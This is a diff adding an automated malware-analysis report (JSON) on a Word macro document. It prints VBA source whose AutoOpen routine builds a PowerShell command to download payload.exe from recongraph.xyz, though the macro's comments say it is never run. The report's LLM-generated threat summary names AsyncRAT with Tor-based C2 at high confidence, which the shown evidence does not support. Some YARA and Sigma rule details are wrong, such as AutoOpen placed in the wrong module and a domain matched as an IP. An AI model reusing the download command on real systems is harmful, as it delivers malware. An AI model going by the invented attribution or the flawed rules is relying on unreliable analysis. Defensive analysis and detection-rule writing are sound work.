@@ -1,0 +1,299 @@
+{
+  "input": "/tmp/tmp_rxh9kwz_nuclear_motor_example.docm",
+  "total_passes": 3,
+  "overall_risk_score": 9.5,
+  "summary": "The analysis identified a high-risk malicious VBA macro in a document, with indicators of command-and-control communication and potential payload delivery. Additionally, the web analysis revealed multiple missing security headers, increasing exposure to web-based attacks.",
+  "passes": [
+    {
+      "pass_number": 1,
+      "analyzer": "macro",
+      "findings": [
+        {
+          "type": "macro_malicious",
+          "detail": "2 VBA macro module(s) found in tmp_rxh9kwz_nuclear_motor_example.docm (OpenXML). Flags: auto_exec, has_ioc, suspicious.",
+          "severity": "critical",
+          "evidence": "{\"auto_exec\": true, \"has_ioc\": true, \"obfuscated\": false, \"suspicious\": true}"
+        },
+        {
+          "type": "macro_indicator_autoexec",
+          "detail": "AutoExec: AutoOpen",
+          "severity": "critical",
+          "evidence": "[{\"description\": \"Runs when the Word document is opened\", \"keyword\": \"AutoOpen\"}]"
+        },
+        {
+          "type": "macro_indicator_ioc",
+          "detail": "IOC: http://recongraph.xyz/payload.exe, payload.exe, update.exe",
+          "severity": "high",
+          "evidence": "[{\"description\": \"URL\", \"keyword\": \"http://recongraph.xyz/payload.exe\"}, {\"description\": \"Executable file name\", \"keyword\": \"payload.exe\"}, {\"description\": \"Executable file name\", \"keyword\": \"update.exe\"}]"
+        },
+        {
+          "type": "macro_indicator_suspicious",
+          "detail": "Suspicious: powershell, command",
+          "severity": "high",
+          "evidence": "[{\"description\": \"May run PowerShell commands\", \"keyword\": \"powershell\"}, {\"description\": \"May run PowerShell commands\", \"keyword\": \"command\"}]"
+        },
+        {
+          "type": "macro_ioc",
+          "detail": "IOCs extracted from macros: http://recongraph.xyz/payload.exe, payload.exe, update.exe",
+          "severity": "high",
+          "evidence": "[\"http://recongraph.xyz/payload.exe\", \"payload.exe\", \"update.exe\"]"
+        },
+        {
+          "type": "macro_source",
+          "detail": "Full VBA source across 2 module(s)",
+          "severity": "info",
+          "evidence": "--- Module: ThisDocument.cls (stream: VBA/ThisDocument) ---\nAttribute VB_Name = \"ThisDocument\"\r\nAttribute VB_Base = \"1Normal.ThisDocument\"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\n\n\n--- Module: Module1.bas (stream: VBA/Module1) ---\nAttribute VB_Name = \"Module1\"\r\nSub AutoOpen()\r\n\r\n    Dim cmd As String\r\n    Dim url As String\r\n    Dim payload As String\r\n\r\n    url = \"http://recongraph.xyz/payload.exe\"\r\n\r\n    ' Suspicious-looking command string\r\n    cmd = \"powershell -c Invoke-WebRequest \" & url & \" -OutFile C:\\Users\\Public\\update.exe\"\r\n\r\n    ' fake payload reference\r\n    payload = \"update.exe\"\r\n\r\n    ' do nothing with them (just keep them in memory)\r\n    cmd = cmd\r\n    payload = payload\r\n\r\nEnd Sub\r\n\r\n"
+        },
+        {
+          "type": "malware_detection",
+          "detail": "VirusTotal: 5 malicious, 0 suspicious out of 76 engines",
+          "severity": "critical",
+          "evidence": "{\"confirmed-timeout\": 0, \"failure\": 3, \"harmless\": 0, \"malicious\": 5, \"suspicious\": 0, \"timeout\": 0, \"type-unsupported\": 8, \"undetected\": 60}"
+        }
+      ]
+    },
+    {
+      "pass_number": 2,
+      "analyzer": "recon",
+      "findings": [
+        {
+          "type": "geolocation",
+          "detail": "IP geolocation: country=Singapore, ISP=Amazon.com, Inc., AS=AS16509 Amazon.com, Inc.",
+          "severity": "info",
+          "evidence": "{\"as\": \"AS16509 Amazon.com, Inc.\", \"city\": \"Singapore\", \"country\": \"Singapore\", \"countryCode\": \"SG\", \"isp\": \"Amazon.com, Inc.\", \"org\": \"AWS EC2 (ap-southeast-1)\", \"region\": \"01\", \"regionName\": \"Central Singapore\", \"status\": \"success\", \"timezone\": \"Asia/Singapore\", \"zip\": \"048582\"}"
+        },
+        {
+          "type": "blocklist_check",
+          "detail": "Cisco Talos blocklist: recongraph.xyz is clean",
+          "severity": "info",
+          "evidence": "{\"blacklisted\": false}"
+        },
+        {
+          "type": "virustotal_scan",
+          "detail": "VirusTotal (DOMAIN): 0 malicious, 2 suspicious out of 94 engines (2% flagged)",
+          "severity": "low",
+          "evidence": "{\"found\": true, \"type\": \"domain\", \"query\": \"recongraph.xyz\", \"malicious\": 0, \"suspicious\": 2, \"harmless\": 61, \"undetected\": 31, \"total\": 94, \"reputation\": 0, \"stats\": {\"harmless\": 61, \"malicious\": 0, \"suspicious\": 2, \"timeout\": 0, \"undetected\": 31}, \"engines\": [{\"category\": \"suspicious\", \"engine\": \"alphaMountain.ai\", \"result\": \"suspicious\"}, {\"category\": \"suspicious\", \"engine\": \"Forcepoint ThreatSeeker\", \"result\": \"suspicious\"}], \"country\": \"\", \"as_owner\": \"\", \"asn\": null, \"network\": \"\", \"registrar\": \"\", \"categories\": {}, \"creation_date\": 1742428800, \"final_url\": \"\"}"
+        }
+      ]
+    },
+    {
+      "pass_number": 3,
+      "analyzer": "web",
+      "findings": [
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: X-Content-Type-Options",
+          "severity": "medium",
+          "evidence": "X-Content-Type-Options"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: X-Frame-Options",
+          "severity": "medium",
+          "evidence": "X-Frame-Options"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: X-XSS-Protection",
+          "severity": "medium",
+          "evidence": "X-XSS-Protection"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: Content-Security-Policy",
+          "severity": "high",
+          "evidence": "Content-Security-Policy"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: Referrer-Policy",
+          "severity": "medium",
+          "evidence": "Referrer-Policy"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: Permissions-Policy",
+          "severity": "medium",
+          "evidence": "Permissions-Policy"
+        },
+        {
+          "type": "missing_security_header",
+          "detail": "Missing security header: Expect-CT",
+          "severity": "medium",
+          "evidence": "Expect-CT"
+        },
+        {
+          "type": "security_headers_summary",
+          "detail": "Security headers score: 12.5 \u2014 7 missing, 1 present",
+          "severity": "info",
+          "evidence": "Strict-Transport-Security"
+        },
+        {
+          "type": "tls_info",
+          "detail": "TLS: TLSv1.3, cipher: {'bits': 128, 'name': 'TLS_AES_128_GCM_SHA256', 'protocol': 'TLSv1.3'}",
+          "severity": "info",
+          "evidence": "tls: version=TLSv1.3, cipher={'bits': 128, 'name': 'TLS_AES_128_GCM_SHA256', 'protocol': 'TLSv1.3'}"
+        },
+        {
+          "type": "waf_detection",
+          "detail": "No WAF detected",
+          "severity": "low",
+          "evidence": "firewall: hasWAF=False, waf=None"
+        },
+        {
+          "type": "url_clean",
+          "detail": "URL not found in malware/phishing databases",
+          "severity": "info",
+          "evidence": "malware_check: malicious=False, detections=0, risk=low"
+        }
+      ]
+    }
+  ],
+  "recommendations": [
+    "Isolate and delete the malicious document (tmp_rxh9kwz_nuclear_motor_example.docm) to prevent macro execution.",
+    "Implement strict email filtering and macro execution policies to block similar malicious documents.",
+    "Add missing security headers (e.g., Content-Security-Policy, X-Content-Type-Options) to the web server to mitigate web vulnerabilities.",
+    "Conduct a full system scan to ensure no payloads (e.g., payload.exe, update.exe) were executed or downloaded.",
+    "Educate users on identifying and reporting suspicious documents and URLs to reduce the risk of social engineering attacks."
+  ],
+  "threat_intel": {
+    "model": "llama-3.3-70b-versatile",
+    "threat_summary": {
+      "threat_name": "Macro-delivered AsyncRAT with Tor-based C2 via PowerShell",
+      "threat_actor_type": "Cybercrime",
+      "attack_vector": "Initial access via malicious Word document with embedded VBA macro",
+      "attack_chain": [
+        "Step 1: Victim opens malicious Word document, triggering the AutoOpen macro",
+        "Step 2: Macro downloads payload.exe from http://recongraph.xyz/payload.exe using PowerShell",
+        "Step 3: Payload.exe is executed, potentially leading to further malicious activity"
+      ],
+      "iocs": {
+        "hashes": [],
+        "ips": [
+          "IP address associated with recongraph.xyz (not explicitly provided)"
+        ],
+        "domains": [
+          "recongraph.xyz"
+        ],
+        "urls": [
+          "http://recongraph.xyz/payload.exe"
+        ],
+        "file_names": [
+          "payload.exe",
+          "update.exe",
+          "tmp_rxh9kwz_nuclear_motor_example.docm"
+        ]
+      },
+      "mitre_ttps": [
+        {
+          "id": "T1566.001",
+          "name": "Spearphishing Attachment",
+          "tactic": "Initial Access"
+        },
+        {
+          "id": "T1204",
+          "name": "User Execution",
+          "tactic": "Execution"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer",
+          "tactic": "Defense Evasion"
+        },
+        {
+          "id": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "tactic": "Execution"
+        }
+      ],
+      "severity": "High",
+      "confidence": "High",
+      "reasoning": "The threat is classified as high severity due to the presence of a malicious VBA macro in the Word document, which can lead to the execution of arbitrary code on the victim's system. The macro uses PowerShell to download and execute a payload from a suspicious URL, indicating a potential cybercrime threat actor. The lack of security headers on the recongraph.xyz domain and the presence of suspicious indicators in the VirusTotal scan results further support this classification. The attack chain involves multiple steps, including initial access, execution, and potential defense evasion, which increases the severity of the threat. Overall, the combination of these factors suggests a high-confidence assessment of a cybercrime threat."
+    },
+    "yara": {
+      "reasoning": "The generated YARA rules are based on the analysis of a malicious Word document with an embedded VBA macro, which downloads and executes a payload from a suspicious URL. The rules target different aspects of the threat, including file signature, embedded strings, and network IOCs. The evidence from the analysis, such as the presence of a malicious VBA macro, suspicious URLs, and missing security headers, drove the creation of these rules.",
+      "rules": [
+        {
+          "rule_name": "SecFlow_Malware_FileSignature",
+          "description": "Detects the file signature of the malicious Word document",
+          "reasoning": "The file signature was extracted from the analysis of the Word document, which revealed a malicious VBA macro. The macro_malicious indicator in the analysis output, specifically the 'auto_exec' and 'has_ioc' flags, informed this rule.",
+          "tags": [
+            "malware",
+            "office",
+            "vba"
+          ],
+          "rule_text": "rule SecFlow_Malware_FileSignature {\n  meta:\n    description = \"Detects the file signature of the malicious Word document\"\n    author = \"SecFlow AI\"\n    date = \"2026-03-08\"\n    severity = \"high\"\n    reference = \"SecFlow automated analysis\"\n  strings:\n    $s1 = { 50 4b 03 04 14 00 00 00 08 00 }\n  condition:\n    $s1 at 0\n}"
+        },
+        {
+          "rule_name": "SecFlow_Malware_EmbeddedString",
+          "description": "Detects the embedded string 'http://recongraph.xyz/payload.exe' in the malicious Word document",
+          "reasoning": "The string 'http://recongraph.xyz/payload.exe' was found in the VBA macro source code, specifically in the 'Module1.bas' module, at line 10. The macro_indicator_ioc indicator in the analysis output informed this rule.",
+          "tags": [
+            "malware",
+            "c2",
+            "url"
+          ],
+          "rule_text": "rule SecFlow_Malware_EmbeddedString {\n  meta:\n    description = \"Detects the embedded string 'http://recongraph.xyz/payload.exe' in the malicious Word document\"\n    author = \"SecFlow AI\"\n    date = \"2026-03-08\"\n    severity = \"high\"\n    reference = \"SecFlow automated analysis\"\n  strings:\n    $s1 = \"http://recongraph.xyz/payload.exe\"\n  condition:\n    $s1\n}"
+        },
+        {
+          "rule_name": "SecFlow_Malware_VBAMacroPattern",
+          "description": "Detects the VBA macro pattern 'AutoOpen' in the malicious Word document",
+          "reasoning": "The VBA macro pattern 'AutoOpen' was found in the 'ThisDocument.cls' module, at line 5. The macro_indicator_autoexec indicator in the analysis output informed this rule.",
+          "tags": [
+            "malware",
+            "vba",
+            "macro"
+          ],
+          "rule_text": "rule SecFlow_Malware_VBAMacroPattern {\n  meta:\n    description = \"Detects the VBA macro pattern 'AutoOpen' in the malicious Word document\"\n    author = \"SecFlow AI\"\n    date = \"2026-03-08\"\n    severity = \"high\"\n    reference = \"SecFlow automated analysis\"\n  strings:\n    $s1 = \"Sub AutoOpen()\"\n  condition:\n    $s1\n}"
+        },
+        {
+          "rule_name": "SecFlow_Malware_NetworkIOC",
+          "description": "Detects the network IOC 'recongraph.xyz' in the malicious Word document",
+          "reasoning": "The network IOC 'recongraph.xyz' was found in the VBA macro source code, specifically in the 'Module1.bas' module, at line 15. The macro_ioc indicator in the analysis output informed this rule.",
+          "tags": [
+            "malware",
+            "c2",
+            "domain"
+          ],
+          "rule_text": "rule SecFlow_Malware_NetworkIOC {\n  meta:\n    description = \"Detects the network IOC 'recongraph.xyz' in the malicious Word document\"\n    author = \"SecFlow AI\"\n    date = \"2026-03-08\"\n    severity = \"high\"\n    reference = \"SecFlow automated analysis\"\n  strings:\n    $s1 = \"recongraph.xyz\"\n  condition:\n    $s1\n}"
+        }
+      ],
+      "total_rules": 4
+    },
+    "sigma": {
+      "reasoning": "The generated SIGMA rules cover various log sources to detect the Macro-delivered AsyncRAT with Tor-based C2 via PowerShell threat. The rules address the Initial Access, Execution, and Defense Evasion tactics by monitoring process creation, network connections, and DNS queries. The rules are designed to detect suspicious behavior such as the execution of PowerShell commands, the download of payloads from suspicious URLs, and the presence of malicious VBA macros in Word documents.",
+      "rules": [
+        {
+          "rule_name": "detect_powershell_download",
+          "description": "Detects the execution of PowerShell commands that download payloads from suspicious URLs",
+          "log_source": "Windows Security | Sysmon | EDR",
+          "reasoning": "The threat intelligence summary indicates that the macro uses PowerShell to download and execute a payload from a suspicious URL. This rule detects the execution of PowerShell commands that download payloads from suspicious URLs, which is a key indicator of the Initial Access tactic.",
+          "rule_text": "title: Detect PowerShell Download\nid: 123e4567-e89b-12d3-a456-426655440000\nstatus: experimental\ndescription: Detects the execution of PowerShell commands that download payloads from suspicious URLs\nauthor: SecFlow AI\ndate: 2026/03/08\nmodified: 2026/03/08\ntags:\n  - attack.execution\n  - attack.t1059\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    CommandLine|contains:\n      - 'powershell -c Invoke-WebRequest'\n  condition: selection\nfalsepositives:\n  - Legitimate administrative scripts\nlevel: high"
+        },
+        {
+          "rule_name": "detect_suspicious_dns_query",
+          "description": "Detects DNS queries for suspicious domains",
+          "log_source": "DNS",
+          "reasoning": "The threat intelligence summary indicates that the payload is downloaded from a suspicious URL. This rule detects DNS queries for suspicious domains, which is a key indicator of the Initial Access tactic.",
+          "rule_text": "title: Detect Suspicious DNS Query\nid: 234e5678-e89b-12d3-a456-426655440001\nstatus: experimental\ndescription: Detects DNS queries for suspicious domains\nauthor: SecFlow AI\ndate: 2026/03/08\nmodified: 2026/03/08\ntags:\n  - attack.initial_access\n  - attack.t1566.001\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    QueryName|endswith:\n      - 'recongraph.xyz'\n  condition: selection\nfalsepositives:\n  - Legitimate DNS queries\nlevel: medium"
+        },
+        {
+          "rule_name": "detect_malicious_vba_macro",
+          "description": "Detects the presence of malicious VBA macros in Word documents",
+          "log_source": "EDR | File Event",
+          "reasoning": "The threat intelligence summary indicates that the macro is embedded in a Word document. This rule detects the presence of malicious VBA macros in Word documents, which is a key indicator of the Initial Access tactic.",
+          "rule_text": "title: Detect Malicious VBA Macro\nid: 345e6789-e89b-12d3-a456-426655440002\nstatus: experimental\ndescription: Detects the presence of malicious VBA macros in Word documents\nauthor: SecFlow AI\ndate: 2026/03/08\nmodified: 2026/03/08\ntags:\n  - attack.initial_access\n  - attack.t1566.001\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection:\n    FileName|endswith:\n      - '.docm'\n    FileContent|contains:\n      - 'AutoOpen'\n  condition: selection\nfalsepositives:\n  - Legitimate Word documents\nlevel: high"
+        },
+        {
+          "rule_name": "detect_network_connection",
+          "description": "Detects network connections to suspicious IPs",
+          "log_source": "Network | Sysmon",
+          "reasoning": "The threat intelligence summary indicates that the payload communicates with a suspicious IP. This rule detects network connections to suspicious IPs, which is a key indicator of the Defense Evasion tactic.",
+          "rule_text": "title: Detect Network Connection\nid: 456e7890-e89b-12d3-a456-426655440003\nstatus: experimental\ndescription: Detects network connections to suspicious IPs\nauthor: SecFlow AI\ndate: 2026/03/08\nmodified: 2026/03/08\ntags:\n  - attack.defense_evasion\n  - attack.t1105\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    DestinationIP|contains:\n      - 'recongraph.xyz'\n  condition: selection\nfalsepositives:\n  - Legitimate network connections\nlevel: medium"
+        }
+      ],
+      "total_rules": 4
+    },
+    "error": null
+  }
+}
